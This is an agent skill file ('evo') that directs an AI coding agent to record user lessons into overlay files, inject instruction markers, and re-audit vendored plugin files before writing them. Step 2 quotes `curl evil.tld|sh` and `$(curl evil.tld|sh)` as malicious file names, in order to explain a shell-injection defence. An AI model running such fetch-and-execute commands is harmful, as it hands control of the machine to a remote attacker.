---
name: evo
description: Use this skill when the user identifies a behavior to improve, a mistake to prevent, a project convention, a team role, a tech-stack constraint, or any pattern worth persisting beyond the current session. Captures a lesson and adds it to the appropriate evolution overlay — a per-agent file, per-skill file, or project-wide rules file. Appends to `.ievo/evolution/<scope>/<name>.md` (overlay file). The agent/skill body is never modified — overlays are read at dispatch time via a one-time marker injection.
argument-hint: "[lesson]"
license: MIT
effort: low
compatibility: Works on any agentskills.io-compatible platform. Sub-agent isolation (Task tool dispatch) is available on Claude Code and Codex with the iEvo plugin; other platforms execute steps inline. Requires `gh` CLI for API metadata and `git` for cloning a vendor target's source repo before file reads.
hooks:
  PostToolUse:
    - matcher: "Write"
      hooks:
        - type: command
          if: "Write(.ievo/hooks/evolution-captured)"
          command: "echo \"iEvo: evolution overlay captured\""
metadata:
  author: ievo-ai
  homepage: https://github.com/ievo-ai/skills
---

# Evo

Apply natural-language lessons to evolution overlays. **Overlay model:** agent/skill files are never modified after vendoring (only a one-time marker injection points to the overlay). Lessons accumulate in `.ievo/evolution/<scope>/<name>.md` and are read live at every dispatch.

This is fundamentally different from "patch the file inline" — see the rationale at the bottom.

## Inputs

- **Required:** lesson text (free-form natural language)
- **Optional:** explicit target ("apply this to spec-writer agent" / "this is project-wide")

If the lesson is too vague (e.g. "be better"), ask for clarification first.

## On Claude Code with the iEvo plugin

If the `evolution` sub-agent is available, delegate via Task tool with `subagent_type: "evolution"`. Pass the lesson verbatim. Otherwise execute the steps below directly.

## Step 0: Auto-evolution candidate intake (optional)

Run this step **only** when reviewing the auto-evolution backlog — e.g. the user
is responding to the SessionStart nudge ("N evolution candidates pending —
review?") from `/ievo:evo-auto-enable`, or explicitly asks to review captured
candidates. For an ordinary single-lesson capture, skip straight to Step 1.

When `.ievo/evo-auto.flag` exists, corrections captured in earlier sessions live
in per-session accumulator files under `.ievo/evolution-candidates/`. List them
with the accumulator (path: `<plugin>/scripts/evolution_candidates.mjs`):

```
node <plugin>/scripts/evolution_candidates.mjs list
```

For **each** candidate's `text`, run it through Steps 1–5.7 as its own lesson, with
the auto-mode reconciliation constraint (per the mode contract):

- **Auto-write only unambiguous project-wide lessons** to `.ievo/evolution/project.md`.
- If scope is **ambiguous** or resolves to an **agent/skill or user-level-only**
  target, do **not** write the overlay silently — append the candidate to
  `.ievo/evolution-candidates/pending.md` for manual review instead (Step 1.5's
  human-in-the-loop reconciliation still governs those).
- After a candidate is folded into an overlay (or parked in `pending.md`),
  **consume it**: remove its line from its session `.jsonl` file so it is not
  re-surfaced next session. Retention (last 10 sessions) is handled by the
  SessionStart hook's `prune`; consuming on write keeps the count honest.

Then continue to Step 1 for the current candidate.

## Step 1: Classify scope

Three possible scopes:

1. **Project-wide** — applies to the whole project (tech stack, team conventions, project context). Signals: "we use X", "our team Y", "this codebase Z". → goes to `.ievo/evolution/project.md`
2. **Agent-specific** — names an agent or describes sub-agent behavior. Signals: "the spec-writer should X". → goes to `.ievo/evolution/agents/<name>.md`
3. **Skill-specific** — names a skill or describes procedural knowledge. Signals: "when working with PDFs, prefer X". → goes to `.ievo/evolution/skills/<name>.md`

For agent/skill scope, determine the **target name** explicitly (from user) or by matching the lesson against available targets. Detect the invoking client once (`$CODEX_CLI` env var ONLY — same rule as `/ievo:init` Step 1.5) and scan that client's own load paths, never the other client's:

**On Claude Code (`$CODEX_CLI` unset) — project-level (preferred):**
- `.claude/agents/*.md`
- `.claude/skills/*/SKILL.md`
- `.claude/plugins/*/agents/*.md`
- `.claude/plugins/*/skills/*/SKILL.md`

**On Claude Code — user-level (fallback — see Step 1.5):**
- `~/.claude/agents/*.md`
- `~/.claude/skills/*/SKILL.md`
- `~/.claude/plugins/*/agents/*.md`
- `~/.claude/plugins/*/skills/*/SKILL.md`

**On Codex (`$CODEX_CLI` set) — skills only:**
- Project-level (preferred): `.agents/skills/*/SKILL.md`
- User-level (fallback — see Step 1.5): `~/.agents/skills/*/SKILL.md`

Codex documents no project-level custom-agent path (same platform filter as `/ievo:init` Step 7a), so an **agent-scope** lesson on Codex has no local target to vendor or inject a marker into. If `.ievo/evolution/agents/<name>.md` already exists (created from a Claude Code session of this project), append the lesson to that overlay (Step 4) and skip Steps 2–3 — the marker in the Claude-Code-side agent file keeps applying it there. Otherwise tell the user agent evolution isn't available on Codex and stop; never fall back to writing `.claude/agents/` from a Codex session.

Match priority: project-level wins if same name appears in both. If no clear match anywhere, ask the user. Do not guess.

### Carve-out: platform-mismatch self-check handoff (overlay-only)

A lesson arriving from a bundled skill's **own** platform-mismatch self-check —
`/ievo:init` Step 12.5 or `/ievo:evo-auto-enable` Step 5.5, recognizable by the
caller passing Trigger `agent self-correction: platform-detection mismatch` —
is the one case where scope and target are **given, not resolved**: skill scope,
target `init` or `evo-auto-enable`. Do **not** match it against the load paths
above, and do **not** ask — the "ask the user, do not guess" rule above does not
apply, because there is nothing to guess. In particular, on Codex the paths
above list only `.agents/skills/*`, where a plugin-shipped iEvo skill does not
appear at all; resolving normally would find no match and force a question the
calling skill's no-question contract forbids.

This handoff is **overlay-only**. Go straight to Step 4 (append to
`.ievo/evolution/skills/<name>.md`), then Steps 5, 5.5, 5.6, 5.7 as usual.
Skip Steps 1.5, 2, and 2.5 **unconditionally** — no user-level copy prompt, no
vendoring, no security re-audit. Vendoring `init` or `evo-auto-enable` into
`.claude/skills/`|`.agents/skills/` would shadow the plugin's own live copy
with a frozen snapshot that stops tracking plugin updates — a far larger,
unrequested change than the one note being recorded, and one that would also
drag in Step 2.5's own YELLOW/RED confirmation.

Step 3 (marker injection) is the **one conditional** skip. The condition is the
same one Step 2 tests — whether the target already exists in the invoking
client's project-level load path (`.claude/skills/<name>/SKILL.md`, or
`.agents/skills/<name>/SKILL.md` on Codex):

- **No local copy** — the normal case, because `init`/`evo-auto-enable` run
  from the plugin: **skip Step 3 as well.** There is no local file to inject a
  marker into, and creating one would be exactly the vendoring this carve-out
  exists to prevent. Never inject into the plugin's own shipped copy.
- **Local copy already present** — the user vendored that skill into their
  project earlier, on their own initiative: **run Step 3 as written** against
  that pre-existing file. It shadows nothing that is not already there, it
  makes the overlay live, and Step 3 is idempotent (a file that already carries
  the marker is left untouched). Both call sites state this same condition, so
  the injection is never a surprise write mid-run.

Two consequences to state honestly rather than paper over:

- **In the normal case the overlay is a record, not an active rule.** Taking
  the no-local-copy branch above means no marker points at
  `.ievo/evolution/skills/<name>.md`, so nothing reads it while the skill runs
  from the plugin. It stands as the local, dated record of what the self-check
  caught — the actionable path for a plugin-side bug is Step 5.6's upstream
  escalation, which this carve-out leaves fully intact.
- **An already-local target behaves normally.** On the other branch, Steps 2
  and 2.5 are already no-ops by their own conditions (the file is local, so
  there is nothing to vendor or re-audit), and Step 3 makes the overlay live
  on the copy the user chose to keep.

## Step 1.5: Handle user-level-only targets (downgrade to project)

If the target was matched **only at user-level** (no project-level instance), evolution can't directly apply to it — overlay files live in `<project>/.ievo/evolution/`, so they only affect this project. The user-level installation is shared across all projects on this machine.

Ask the user via `AskUserQuestion`:

- **Question:** `<target-name> is installed at user-level (<matched user-level path — ~/.claude/ on Claude Code, ~/.agents/skills/ on Codex>). Copy to project to enable per-project evolution?`
- **Header:** `User-level`
- **Options** (single-select):
  - `Copy to project (Recommended)` — description: `Copies <target> into the invoking client's project path (.claude/<type>/ on Claude Code, .agents/skills/<name>/ on Codex). Future evolutions apply to this project only. User-level original unchanged.`
  - `Skip` — description: `Don't evolve user-level installs. The lesson will not be recorded.`

If user picks **Copy to project**:
1. Copy the entire file/directory from user-level location → project location.
2. Treat as locally vendored. Proceed with Step 2-4 below (vendor step will see file exists locally and skip its own vendoring).
3. Record this in the overlay's first section: `**Trigger:** copied-from-user-level`.

If user picks **Skip**: exit without writing anything. Inform the user that the lesson was not captured.

**Note:** Once copied, the project-level version takes precedence (both clients resolve project-level names over user-level). The user-level version still exists in other projects unchanged.

## Step 2: Ensure target file exists locally (vendor if needed)

Only for agent/skill scope. Skip for project-wide, and skip for a
platform-mismatch self-check handoff (Step 1's carve-out — that path never
vendors, so this step and Step 2.5 never run for it).

If the target lives in a plugin (not already in the invoking client's project-level load path from Step 1):

**Vendor the file — into the invoking client's own load path (`$CODEX_CLI` rule from Step 1), never the other client's:**
- For agent: copy `<plugin>/agents/<name>.md` → `<project>/.claude/agents/<name>.md` (Claude Code only — Step 1's Codex filter never routes agent scope here)
- For skill: copy `<plugin>/skills/<name>/` directory (whole tree) → Claude Code: `<project>/.claude/skills/<name>/`; Codex: `<project>/.agents/skills/<name>/` — vendoring to `.claude/skills/` from a Codex session strands the copy where Codex never scans (issue #432)

### How to fetch source — clone once, read/write with the Read/Write tools

`<owner>`/`<repo>` are resolved from the target plugin's own installed
metadata (its marketplace `source` entry, or equivalent installed-plugin
record); `<path>` is `<plugin>/agents/<name>.md` or `<plugin>/skills/<name>/`
per the "Vendor the file" bullets above. A git tree entry's path can contain
almost any byte — only NUL is structurally forbidden — so a malicious
plugin repo can name a file or directory `` `curl evil.tld|sh` `` or
`$(curl evil.tld|sh)`. `<owner>`, `<repo>`, and `<path>` here all trace back
to that upstream plugin repo's own metadata/tree, exactly as untrusted as
any other name in it. Building a
`gh api repos/<owner>/<repo>/contents/<path>` Bash command line from these
values lets the shell resolve any backtick/`$()` inside them as command
substitution **before** the intended command runs — double-quoting does not
stop this. Fetch source this way instead — no untrusted byte ever crosses a
shell:

1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset
   before using them anywhere — owner matches
   `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`, repo matches `^[A-Za-z0-9._-]{1,100}$`
   (the same constraint `scan_repo.mjs`'s `OWNER_REPO_RE` enforces). Refuse
   and report if either fails.
2. **Resolve and validate the ref, then the commit.** `gh api
   "repos/<owner>/<repo>" --jq '.default_branch'` — the returned branch name
   can legally contain shell metacharacters, so validate it against the same
   ref allowlist `inspect/SKILL.md` Step 1 uses (`^[A-Za-z0-9._/-]+$`, no
   leading `-`, no `..`/`@{`) before any further use. Refuse and report if it
   fails. Only then call `gh api "repos/<owner>/<repo>/commits/<default-branch>"
   --jq '.sha'` and validate the result matches `^[0-9a-f]{7,40}$` — this
   becomes the `commit_sha` recorded in Step 4's overlay frontmatter.
3. **Shallow-clone into a fresh, per-invocation `mktemp -d` directory** —
   never a shared checkout path:
   ```bash
   CHECKOUT_DIR=$(mktemp -d)
   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
   git -C "$CHECKOUT_DIR" checkout <commit-sha>
   ```
4. **For an agent** (`<path>` = `<plugin>/agents/<name>.md`): read
   `$CHECKOUT_DIR/<path>` into context with the **Read tool** (its full path
   passed as the `file_path` parameter — never Bash `cat`). Do not write it
   yet — Step 2.5 below re-audits it before anything touches
   `<project>/.claude/agents/`.
5. **For a skill** (`<path>` = `<plugin>/skills/<name>/`, whole tree):
   enumerate it with the **Glob tool** (`pattern: "**/*"`, `path:
   "$CHECKOUT_DIR/<path>"` — never a Bash `find`/`ls`), then **Read** each
   listed file into context. Do not write yet — same reason as above. Glob
   and Read take paths as direct parameters, never shell text, so neither a
   malicious `<path>` nor a malicious file name inside the skill directory
   can reach a shell.

If cloning or resolution fails (private repo, no network), report the
failure — do NOT fall back to per-file `gh api` fetching, which reintroduces
the injection this replaces.

## Step 2.5: Re-audit before the content touches the trusted directory

The content Step 2 just read into context is about to land in
`<project>/.claude/agents/<name>.md` or `<project>/.claude/skills/<name>/`
(on Codex: `<project>/.agents/skills/<name>/`) — the project's trusted
execution directory, dispatched by name on every future session — and it
has never been reviewed.

**On Claude Code or Codex** (a `Task`/sub-agent tool and `AskUserQuestion`
are available here — this step runs in the main session, not a dispatched
sub-agent): dispatch a fresh `security-auditor` sub-agent against it,
mirroring `update.md`'s own Step 2.5:
```
Task(subagent_type="security-auditor",
     prompt="Audit <owner>/<repo>@<name> with type=<skill|agent>")
```
Collect the verdict:
- **GREEN** → proceed to the write below. No user friction.
- **YELLOW or RED** → do NOT write anything yet. Surface it via
  `AskUserQuestion` before anything touches disk:
  - **Question:** `<type>/<name> was flagged <verdict> on re-audit: <top 1-2
    flags — category + one-line explanation>. Vendor it anyway?`
  - **Header:** `Re-audit`
  - **Options** (single-select):
    - `Apply anyway (I've reviewed the flags)` — proceed to the write below.
    - `Skip — do not vendor` — abort this capture (see below).

  **No interactive session available** (e.g. this run was launched from an
  `/ievo:schedule` Routine — recognizable by a self-contained invocation
  prompt like "You are running a scheduled iEvo operation", per
  `schedule/SKILL.md` — or any other headless/CI invocation where
  `AskUserQuestion` cannot be answered): do not block waiting for input.
  Auto-select `Skip — do not vendor`, same as an explicit decline, and call
  it out in Step 6 as `SKIPPED — flagged <verdict>, no interactive session
  to confirm` — matching `update.md`'s own documented fallback for the
  identical situation.

**On any other platform** (no `Task`/sub-agent tool, or no
`AskUserQuestion` — most non-Claude-Code/Codex agentskills.io platforms):
you cannot dispatch a separate `security-auditor` sub-agent (`agents/` is a
Claude Code/Codex-specific mechanism). Apply the antivirus deep-scan
methodology from the `security-check` skill directly instead — read
`security-check/SKILL.md` in this plugin and follow its Step 3
(threat-pattern reasoning) and Step 4 (verdict construction) against the
content already in hand, the same technique the `evolution` sub-agent's own
Step 2.5 uses for the identical constraint (see its frontmatter comment for
why it has neither tool either). Since you also have no way to prompt
interactively here, treat YELLOW/RED as an unconditional auto-skip — no
"apply anyway" option, same outcome as the no-interactive-session case
above.

**On GREEN, or an explicit/auto "Apply anyway":** write the content now —
for an agent, write to `<project>/.claude/agents/<name>.md` with the
**Write tool**; for a skill, write each file read in Step 2 to the matching
relative location under Step 2's client vendor path (`<project>/.claude/skills/<name>/`
on Claude Code, `<project>/.agents/skills/<name>/` on Codex) with the **Write
tool**. Record `fetched_at` as the current ISO timestamp. Continue to Step
3.

**On Skip (explicit, auto, or unconditional):** do NOT write anything to
the client vendor paths above, and do not
proceed to Step 3 (no local file to inject a marker into) or Step 4 (no
vendored target to append an overlay against). Report `SKIPPED — flagged
<YELLOW|RED> on re-audit, vendor declined` (Step 6) and stop — inform the
user the lesson was not captured, and that they can vendor
`<owner>/<repo>@<path>` manually after reviewing the flags if they
disagree. Never fabricate a lower verdict to force the write through.

**This is one-time.** Subsequent evolutions on the same target find it
already local (Step 2's own condition) and skip vendoring — and Step 2.5 —
entirely.

## Step 3: Inject overlay marker (one-time per target)

Read the local target file. Check if it already contains the iEvo overlay marker:

```markdown
<!-- ievo:start -->
...
<!-- ievo:end -->
```

If **marker already present** → skip step 3. Marker is idempotent.

If **no marker** → inject it. Placement depends on scope:

### Agent (`.claude/agents/<name>.md`)

Insert marker BLOCK right after the frontmatter `---` line, before the agent's body:

```markdown
---
name: spec-writer
description: ...
---

<!-- ievo:start -->
**Before applying the instructions below**, read `.ievo/evolution/agents/spec-writer.md` if it exists, and apply ALL rules from its sections IN ADDITION to the agent's instructions.
<!-- ievo:end -->

# Spec Writer
[agent body...]
```

### Skill (`.claude/skills/<name>/SKILL.md`; on Codex `.agents/skills/<name>/SKILL.md`)

Same pattern — marker after frontmatter, before body:

```markdown
---
name: <skill-name>
description: ...
---

<!-- ievo:start -->
**Before applying the instructions below**, read `.ievo/evolution/skills/<name>.md` if it exists, and apply ALL rules from its sections IN ADDITION to the skill's instructions.
<!-- ievo:end -->

# <Skill Body>
[...]
```

### Project-wide (`CLAUDE.md` or `AGENTS.md`)

Find the project root instruction file to host the marker. Priority:

1. **Thin-pointer detection (check first).** If `CLAUDE.md` exists but is a *thin pointer* that delegates to `AGENTS.md` as the single source of truth, host the marker in `AGENTS.md` instead. Treat `CLAUDE.md` as a thin pointer when it is short (≤ ~20 lines of content) **and** references `AGENTS.md` (case-insensitive match on `AGENTS.md`) as where the rules live — i.e. its whole purpose is to redirect to `AGENTS.md`, not a substantive rules file that merely mentions `AGENTS.md` in passing. Both conditions must hold, to avoid a false positive on a real `CLAUDE.md` that happens to cite `AGENTS.md`. This matters for cross-platform reach: **Codex reads `AGENTS.md`, not `CLAUDE.md`**, so a marker parked in a redirect-stub `CLAUDE.md` is invisible to Codex sessions — while Claude Code still reaches the overlay via the pointer to `AGENTS.md`. When the thin-pointer pattern holds, `AGENTS.md` is the one file BOTH platforms effectively read: single host, zero drift, **no dual-inject**.
2. Else `CLAUDE.md` if it exists (a substantive rules file).
3. Else `AGENTS.md` if it exists.
4. Else create `CLAUDE.md` (empty if needed).

Before injecting, check **both** `CLAUDE.md` and `AGENTS.md` for an existing `<!-- ievo:start -->` marker — if *either* already carries one, **skip** (the project already has a project-wide overlay pointer). Checking both, not just the currently-selected host, preserves the single-host guarantee even if `CLAUDE.md` changed shape between captures (e.g. a thin pointer that later grew into a substantive rules file): without this, a second capture could inject a duplicate marker into the other file.

If neither file has a marker → append the block below to the end of the chosen host, **creating that host if it does not yet exist** (e.g. a `CLAUDE.md` that points at an `AGENTS.md` which is not on disk yet):

```markdown

<!-- ievo:start -->
**Before applying the instructions below**, read `.ievo/evolution/project.md` if it exists, and apply ALL rules from its sections IN ADDITION to the project's instructions.
<!-- ievo:end -->
```

The project marker uses an **explicit natural-language instruction** (mirroring the agent/skill markers above), NOT a bare `@.ievo/evolution/project.md` import line: Codex has no `@include` resolution ([openai/codex#17401](https://github.com/openai/codex/issues/17401)), so an explicit instruction is platform-neutral — Claude Code follows it just as well, so nothing is lost.

## Step 4: Append the lesson to the overlay file

The overlay file path:
- Agents: `.ievo/evolution/agents/<name>.md`
- Skills: `.ievo/evolution/skills/<name>.md`
- Project: `.ievo/evolution/project.md`

### If overlay file does NOT exist

Create with frontmatter (for agent/skill) and header.

**Agent / Skill format:**
```markdown
---
target: <agent | skill>
target_name: <name>
created: <ISO timestamp>
# `source` populated only if vendored from a plugin:
source:
  repo: <owner>/<repo>
  path: <source path>
  commit_sha: <short sha>
  fetched_at: <ISO timestamp>
---

# <name> — Evolution Overlay

(empty until first evolution added)
```

**Project format:**
```markdown
# Project — Evolution Overlay

(project-wide rules accumulated here; loaded into context via marker block in CLAUDE.md/AGENTS.md)
```

### Append the new section

```markdown

## <YYYY-MM-DD HH:MM UTC> — <short title derived from lesson>
**Trigger:** <user-observed mistake / user-defined convention / vendored / etc.>

<full lesson text — verbatim from user>
```

Date in `YYYY-MM-DD HH:MM UTC`. Title 5-10 words. Trigger field captures the WHY (see Step 5).

## Step 5: Determine the Trigger value

Pick one from this list (or write a short custom string if none fits):

- `user-observed mistake during <activity>` — user noticed buggy behavior
- `user-defined convention` — establishing a new rule, not fixing
- `vendored from <upstream>` — initial vendor (only set by /ievo:init)
- `upstream rebase` — added by /ievo:update during replay
- `agent self-correction: platform-detection mismatch` — set by `/ievo:init`
  Step 12.5 / `/ievo:evo-auto-enable` Step 5.5 when a skill's own platform
  self-check catches its printed output mismatching the detected platform
- `curator pattern (from N projects)` (future)

If unclear from the conversation, default to `user-observed mistake` or `user-defined convention` based on lesson tone.

## Step 5.5: Signal file for lifecycle hooks

After the overlay append in Step 4 succeeds, write `.ievo/hooks/evolution-captured` (create the directory if absent). The body is a single line: the ISO-8601 UTC timestamp of the capture. This file is the trigger for any `PostToolUse` hook configured via `/ievo:hooks-setup` matching `Write(.ievo/hooks/evolution-captured)`.

Use the Write tool (NOT Bash) so the matcher fires:
- `file_path`: `.ievo/hooks/evolution-captured` (relative — the `PostToolUse` matcher `Write(.ievo/hooks/evolution-captured)` only fires on this exact form; never prefix `<project>/` or use an absolute path)
- `content`: `<ISO-8601 UTC timestamp of this capture>`

Always write — costs nothing, unblocks hook configuration added later. Skip if Step 4 failed.

Zero-setup built-in: this skill's own `hooks:` frontmatter (above) already prints a one-line confirmation on this exact write, active only while `evo` is running. When the capture is delegated to the `evolution` sub-agent instead (see "On Claude Code with the iEvo plugin" above), the equivalent frontmatter hook on `agents/evolution.md` covers that path — one or the other fires depending on which one performs this Step, never both. `/ievo:hooks-setup` remains available for a richer, persistent, cross-session notification (desktop popup, custom script) on the same signal file.

## Step 5.6: Offer to escalate the lesson upstream (optional)

After the overlay append (Step 4) and signal file (Step 5.5) succeed, decide — with a cheap, signal-word heuristic (no sub-agent dispatch, same lightweight style as Step 1) — whether this lesson is worth sharing upstream as feedback to the iEvo plugin repo. This keeps the capture fast: the default is silent, and you only ever prompt once.

**Classify upstream relevance. Default: local — and when local, do NOT prompt.**

The lesson is **upstream-relevant** only when it describes a gap, bug, or missing capability in the **iEvo plugin itself** — its skills, agents, commands, or overlay/marker mechanics — that would help *any* iEvo user, not just this project. Signals (need at least one, and it must be about iEvo's *own* behavior):

- It names an iEvo capability — a `/ievo:*` command, a bundled skill or agent (`evo`, `feedback`, `deep-review`, `deep-reviewer`, `init`, `overlay-status`, …), the overlay/marker mechanics, or a `.ievo/` path — **and** frames a shortcoming or wish about *its* behavior ("didn't", "doesn't", "should", "missing", "can't", "no option to", "bug").
- The vendored target (Step 2) resolved to an iEvo plugin file (the overlay's `source.repo` is `ievo-ai/skills`) **and** the lesson is about that shipped capability itself, not a project-local tweak of it.

The lesson is **local** (the default) when it is a project convention, tech-stack fact, team role, or a mistake specific to this codebase — even when it lives on an iEvo agent/skill overlay (e.g. "in our repo the spec-writer must cite ticket IDs" targets the `spec-writer` overlay but is a project rule, not an iEvo gap). **When in doubt, stay local:** the offer is a nicety, not a gate, and a false nag undercuts the low-effort capture design.

**If local:** skip straight to Step 6. Ask nothing, write nothing.

**If upstream-relevant:** offer once via `AskUserQuestion` (never auto-post):

- **Question:** `This lesson looks like it's about the iEvo plugin itself. Also share it as feedback to the plugin repo?`
- **Header:** `Share upstream`
- **Options** (single-select):
  - `Share as feedback (Recommended)` — description: `Hands off to /ievo:feedback with this lesson pre-filled. You still review and explicitly confirm before anything is posted publicly.`
  - `Skip` — description: `Keep the lesson local to this project. Nothing is posted.`

If the user picks **Skip** (or the platform can't prompt / has no `feedback` skill available): proceed to Step 6. Nothing is posted.

If the user picks **Share as feedback:** hand off to the `feedback` skill (`/ievo:feedback`) with the lesson **pre-filled** — this is flow **(C) Evo handoff** in `feedback/SKILL.md` Step 0:

- Pass the **verbatim lesson text** (the same text appended to the overlay, in the user's original language) as the feedback body, so `feedback` **skips its Step 2** (collect feedback text — already known).
- Do **not** translate here. If the lesson is non-English, `feedback`'s Step 3.75 translates it **once**, at the feedback stage — never duplicate translation in this skill.
- `feedback` still runs its Step 1 (classify type), Step 3 (environment context), Step 3.5 (clarify — usually skipped, the lesson is already specific), Step 4 (build body), and — critically — **Step 5 (public-posting confirmation gate) unchanged**. Public posting stays behind that explicit `Submit` / `Cancel` gate; this skill never posts anything itself.

Then continue to Step 5.7. The overlay capture is already complete and stands regardless of the feedback outcome (share, skip, or cancel at the gate).

> When the capture was delegated to the `evolution` sub-agent (see "On Claude Code with the iEvo plugin" above), the sub-agent performs Steps 1–5.5 and reports its upstream-relevance verdict + the verbatim lesson back to you; a dispatched sub-agent has no way to prompt or launch another skill, so you (the caller) run this Step 5.6 — the offer and the `/ievo:feedback` handoff — in the main session.

## Step 5.7: Offer to extract generalizable overlay entries into a skill/agent (optional)

After the overlay append (Step 4), the signal file (Step 5.5), and the upstream-escalation offer (Step 5.6) all resolve, run one more cheap check, same lightweight style as Step 1 and Step 5.6: no sub-agent dispatch, no fixed entry-count threshold. This runs on **every** overlay append — Project-wide, agent-scope, or skill-scope alike (the overlay is whichever of `.ievo/evolution/project.md`, `.ievo/evolution/agents/<name>.md`, or `.ievo/evolution/skills/<name>.md` Step 4 just wrote to) — not just when reviewing the Step 0 auto-evolution backlog.

**Cluster judgment.** Read the full current content of the overlay file Step 4 just appended to (now including the entry you just added). Judge, by reasoning over the entries — not a mechanical count — whether 2 or more entries independently describe the **same recurring flow or role**: a repeatable procedure ("do A → B → C whenever X happens") or a repeatable judgment/review stance needing its own context. A single isolated entry, or entries that only share surface keywords without describing the same recurring thing, do NOT count. **Default: no cluster detected — and when none is detected, do NOT prompt.** This mirrors Step 5.6's "when in doubt, stay local" bias: the offer is a nicety, not a gate, and a false nag on every capture undercuts the low-effort capture design.

**If no cluster is detected:** skip straight to Step 6. Ask nothing, write nothing.

**If a cluster is detected:** offer once via `AskUserQuestion` (never auto-extract):

- **Question:** `<overlay> has entries that look like they describe a repeatable <procedure | role | mix of both> — extract into a dedicated skill/agent now?` (substitute `<overlay>` with `project.md`, `the <name> agent's overlay`, or `the <name> skill's overlay`, matching whichever file Step 4 appended to)
- **Header:** `Extract`
- **Options** (single-select):
  - `Extract now (Recommended)` — description: `Hands off to /ievo:consolidate scoped to this overlay (root=<overlay path>). Walks Discovery -> Analysis -> Proposal -> Migration -> Verification with 3 checkpoints — nothing is removed from the overlay without your explicit approval at the Migration checkpoint.`
  - `Not now` — description: `Keep the entries in the overlay as-is. Run /ievo:consolidate manually later if you change your mind.`

If the user picks **Not now** (or the platform can't prompt / has no `consolidate` skill available): proceed to Step 6. Nothing is extracted.

If the user picks **Extract now:** hand off to the `consolidate` skill (`/ievo:consolidate --root <overlay path>`, i.e. whichever of `.ievo/evolution/project.md` | `.ievo/evolution/agents/<name>.md` | `.ievo/evolution/skills/<name>.md` Step 4 appended to) — `consolidate/SKILL.md` Step 0 auto-detects entry-cluster mode from that root path, so no extra flag is needed beyond the root. `consolidate` runs its own Discovery through Verification phases and all 3 of its own checkpoints independently; this step's job ends at the handoff. The overlay capture from Step 4 is already complete and stands regardless of what the user decides inside `consolidate` (extract, decline per-cluster, or cancel at any of its checkpoints).

> When the capture was delegated to the `evolution` sub-agent, it performs the cluster judgment above as its own Step 4.7 (it already holds the freshly-appended overlay from its Step 4, whichever scope it targeted) and reports the verdict back to you; a dispatched sub-agent has no way to prompt or launch another skill, so you (the caller) run this Step 5.7 — the offer and the `/ievo:consolidate` handoff — in the main session, using the sub-agent's reported verdict instead of re-judging from scratch.

Then continue to Step 6.

## Step 6: Report

If Step 2.5 (this skill's own, or the delegated `evolution` sub-agent's)
flagged the vendor target and aborted the capture, report only that
outcome — Steps 3 onward never ran, so none of the fields below apply:

- `SKIPPED — flagged <YELLOW|RED> on re-audit: <top 1-2 flags — category +
  one-line explanation>. Vendor declined, no lesson captured. Review the
  flags and, if you disagree, vendor <owner>/<repo>@<path> manually.`
- Or, for the no-interactive-session case: `SKIPPED — flagged <verdict>, no
  interactive session to confirm.`

Otherwise, output a short summary to the user:

- **Scope + target:** project | agents/<name> | skills/<name>
- **Overlay file:** path
- **Marker injected:** yes (first evolution for this target) | no (already present)
- **Section title added:** "<title>"
- **Upstream escalation:** not applicable (local lesson) | offered → handed off to `/ievo:feedback` | offered → skipped
- **Extraction offer:** not applicable (no cluster detected) | offered → handed off to `/ievo:consolidate` | offered → skipped
- **Next:** "Review with `git diff .ievo/evolution/<scope>/<name>.md` and commit if satisfied."

## Rules

- **NEVER modify the agent/skill body.** Only inject the marker block ONCE per target. All rules accumulate in the overlay file. The agent file stays close to upstream forever.
- **Idempotent marker injection.** Re-running evolution on the same target adds to the overlay only — marker is already there from first run.
- **Verbatim lesson text.** No paraphrasing, no sanitization, no "improvement". The user's voice is the rule.
- **Conflict surfacing.** If the new lesson contradicts an existing section in the overlay, do NOT silently override. Quote the conflicting section and ask the user how to resolve.
- **Temporal anchoring.** A lesson that asserts *how the system currently works* (e.g. "workflow X runs only on non-draft PRs", "the /foo comment triggers nothing") rots silently: overlays are read live as instructions at every dispatch, so the claim keeps being applied after the system moves and the entry becomes false. When a lesson makes such a claim, surface it and steer it one of two ways before appending — do NOT silently rewrite the verbatim text (that would violate "Verbatim lesson text"): (a) if it is a point-in-time observation, anchor it in time — past tense, scoped to its moment, with a date/PR anchor where available ("at the time, before <PR/date>, X only ran on Y") so the entry stays true under ANY later change to the system it mentions; or (b) if it is meant as durable current behavior, it belongs in the owning agent/skill body or an overlay *rule*, not a dated snapshot entry. This complements Conflict surfacing: that rule catches a new lesson contradicting an old one; this one catches the system moving out from under an old, unchallenged lesson.
- **Idempotent failures.** If any step fails (write fails, gh api error), report what was done and what was not. Don't leave inconsistent state.
- **Project-wide overlay is shared.** All project-wide rules accumulate in one `project.md`. No splitting by topic — chronological with `## Trigger` field for context.
- **Never interpolate a path — `<owner>`, `<repo>`, or the target `<path>` — into a Bash/`gh api` command.** Clone once, enumerate with the Glob tool, and read/write with the Read/Write tools instead — see § "How to fetch source" in Step 2. A git tree entry can legally contain shell metacharacters (backtick, `$()`, `;`, `|`, quotes); only ever passing such values as direct tool parameters, never embedded in a command string, closes that off.
- **Re-audit gates vendoring, not every capture.** Step 2.5 only applies when Step 2 is vendoring fresh content from a plugin — an already-local target, a project-wide lesson, or a platform-mismatch self-check handoff (Step 1's carve-out, which never vendors) skips it entirely. A YELLOW/RED verdict that isn't explicitly overridden aborts the whole capture (no overlay write, no marker injection) — never fabricate a lower verdict, or silently write anyway, to force the capture through.

## Why overlay model

| Aspect | Old patch-direct | New overlay |
|--------|------------------|-------------|
| Agent file | Drifts from upstream with each evolution | Stays clean, ~unmodified after vendor |
| Source of truth | Split: file body + log | **Single:** overlay file |
| Upstream rebase | Replay all log entries via Opus (drift risk) | Refresh agent file, overlay untouched |
| Visibility of evolutions | Mixed into agent prose | `cat overlay.md` shows everything |
| Conflict detection | Hard (need diff against past) | Easy (compare overlay sections) |

The overlay file is also a self-contained record: anyone reading `<name>.md` sees the full history with dates and triggers. Useful for curator (L2) to detect cross-project patterns.

## See also

- `overlay-status/SKILL.md` — `/ievo:overlay-status` lists every overlay this skill has built up in the current project, grouped by scope (Project / agents / skills) with last-modified dates and one-line summaries. Use it after a `/ievo:evo` capture to confirm the new lesson landed where you expected, or at session start to see what rules are already active.
